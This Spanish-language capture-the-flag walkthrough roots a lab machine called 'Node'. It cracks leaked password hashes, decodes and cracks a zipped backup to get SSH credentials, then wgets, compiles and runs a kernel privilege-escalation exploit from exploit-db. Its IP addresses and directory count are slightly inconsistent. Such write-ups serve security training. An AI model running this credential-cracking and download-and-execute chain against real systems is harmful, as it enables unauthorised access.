# Machine Node

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -Pn -sV 212.129.28.18
``` 
2. El resultado es el siguiente:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
3000/tcp open  http    Node.js Express framework
```

## Analisis de vulnerabilidades

- Luego ejecute **Dirb** de esta manera
```
$ dirb http://212.83.175.138:80
```
- No me genero ninguna subcarpeta

## Exploiting

- Voy al puerto **3000** y veo que hay una pagina sencilla
- En el codigo fuente hay 3 directorios de **controller**, que son estos
```
assets/js/app/controllers/home.js
assets/js/app/controllers/login.js
assets/js/app/controllers/admin.js
assets/js/app/controllers/profile.js
```
- Las URL importantes son estas:
```
assets/js/app/controllers/profile.js
assets/js/app/controllers/home.js
```
- Estas URL contienen varios HASH entonces voy a usar **hash-buster** por ejemplo
```
$ python3 hash-buster -s <HASH>
```
- Los HASH decifrados son estos
```
+ username: tom, password: spongebob
+ username: mark, password: snowflake
+ username: myP14ceAdm1nAcc0uNT, password: manchester
```
- Ingreso al admin de la pagina con el usuario **myP14ceAdm1nAcc0uNT** y puedo descargar un archivo
- El archivo descargado lo abro con el comando **cat** y veo que al final tiene un **=** entonces eso es un **base64**
- Voy a decifrar el archivo y hago la salida a otro archivo de esta manera
```
$ cat myplace.backup | base64 --decode > archivo
```
- Vamos a usar el comando **file** para ver el tipo de archivo que es
```
$ file archivo
```
- Como resultado es un archivo **zip** y le voy añadir la extension **.zip** de esta manera
```
$ mv archivo archivo.zip
```
- Al descomprimirlo nos pide una contraseña
```
$ unzip archivo.zip
```
- Vamos a usar una herramienta
```
$ fcrackzip -D -p rockyou.txt archivo.zip
```
- La contraseña obtenida es esta **magicword**
- Ahora podemos decifrar el archivo **.zip** y nos genera una carpeta **var**
- Revise todos los archivos de cada carpeta y el que tiene algo interesante es **app.js**
```
mongodb://mark:5AYRft73VtFpc84k@localhost:27017
```
- Uso esa credenciales para entrar al SSH
```
$ ssh mark@212.129.28.18
```
- Uso el comando **sudo -l** y no ha funcionado, entonces decido ver la version del **kernel**
```
$ uname -r
```
- En internet esta este exploit
```
https://www.exploit-db.com/exploits/44298
```
- En la maquina victima lo descargo de esta manera:
```
$ wget https://www.exploit-db.com/raw/44298
```
- Con el comando **mv** voy a renombrar el archivo para colocarle la extendio **.c** de esta manera
```
$ mv 44298 44298.c
```
- Luego compilo el archivo
```
$ gcc 44298.c -o exploit
```
- Le doy permisos de ejecucion al archivo compilado que es de nombre **exploit**
```
$ chmod +x exploit
```
- Por ultimo lo ejecuto y ya soy **root**
```
$ ./exploit
```

## Explotación maquina Ignite

https://resources.infosecinstitute.com/node-1-ctf-walkthrough/#gref
